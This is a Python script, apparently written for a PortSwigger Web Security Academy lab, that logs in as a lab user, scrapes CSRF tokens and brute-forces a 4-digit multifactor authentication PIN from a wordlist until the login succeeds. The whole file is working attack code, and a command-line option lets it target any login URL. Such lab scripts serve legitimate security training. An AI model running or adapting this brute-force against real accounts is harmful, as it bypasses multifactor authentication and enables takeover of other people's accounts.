"""
This script is for multifactor authentification with CSRF tokens in the body.
This script logins in first as user and then bruteforces the 4 digits pin.
#name="csrf" value="3qC2xQN5tD53DcfVzkl9DwhEVVvPch2E"
"""

#!/usr/bin/env python3
import re
import requests
import sys
import argparse

#initialisation of variables
host = 'https://ac691f2a1fa6790f807e0e84002700a3.web-security-academy.net'
login_url = host + '/login'
pin_url = host + '/login2'
username = 'carlos'
password = 'montoya'
wordlist = []
filePath = "/home/kali/Documents/crunch-wordlist/4-digit-pin-list-short.txt"
tokenRegex = 'input.+?name="csrf".+?value="(.+?)"'

def loginUser(username, password, session):
    login_page = session.get(login_url)
    csrf_token = re.search(tokenRegex, login_page.text).group(1) 
    dataCorrect = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    
    login_result = session.post(login_url, data = dataCorrect, allow_redirects = True)
    return login_result 

def providePin(pin, session, csrf_token):
    session.get(pin_url, allow_redirects = True)
    data = {
        'csrf': csrf_token,
        'mfa-code': pin
    }
    
    result = session.post(pin_url, data = data, allow_redirects = True)
    return result 

# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url

# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate pins from file
for p in lines:
    wordlist.append(p)
f.close()

# iterating over pin
for pin in wordlist:
    session = requests.Session()
    #session.proxies={'http': 'https://localhost:8080'}

    pin = pin.rstrip()
    print('[*] Trying pin: "{p}"'.format(p = pin))
    
    pinPage = loginUser(username, password, session)
    if 'Please enter your 4-digit security code' not in pinPage.text:
        print('******Navigating to PIN page failed********')
    csrf_token = re.search(tokenRegex, pinPage.text).group(1)
    #print("Regex account page: " + csrf_token)
    
    result = providePin(pin, session, csrf_token)
    if 'Incorrect security code' not in result.text:
        print("*.*pin found for " + username + ": " + pin) 
        sys.exit()